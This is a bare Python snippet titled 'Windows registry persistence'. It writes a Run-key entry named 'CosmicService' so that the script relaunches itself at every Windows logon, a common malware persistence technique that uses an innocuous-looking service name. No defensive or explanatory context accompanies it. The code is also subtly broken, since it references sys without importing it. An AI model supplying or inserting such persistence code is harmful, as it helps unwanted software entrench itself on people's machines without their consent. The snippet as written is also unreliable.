# Windows registry persistence
import winreg

key = winreg.HKEY_CURRENT_USER
subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"

with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
    winreg.SetValueEx(regkey, "CosmicService", 0, winreg.REG_SZ, sys.executable + " " + __file__)